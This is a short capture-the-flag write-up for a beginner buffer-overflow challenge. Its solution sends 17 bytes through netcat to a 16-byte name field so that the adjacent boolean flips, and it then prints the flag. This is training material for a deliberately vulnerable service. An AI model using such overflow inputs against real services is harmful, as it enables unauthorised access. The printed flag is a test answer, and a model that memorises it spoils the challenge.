# Overflow 100

## Description
Author: Josch

Welcome to the bufferzone, The ultimate pwn experience! If you're able to exploit this application you're one of the top hackers in the world and deserve a flag, so get to hacking!

nc overflow100.heltsikker.no 9000

### Hint
Name is only 16 bytes, what happens if you write more than 16?

## Solution
The buffer is only 16 bytes as the hint alludes to, and the bool is stored right after so if we write 16 bytes to fill the buffer and one non-zero byte we get the flag:

```bash
echo "aaaaaaaaaaaaaaaaa" | nc overflow100.heltsikker.no 9000
```
```
HSCTF{memory_corruption_is_bad_mkay}
```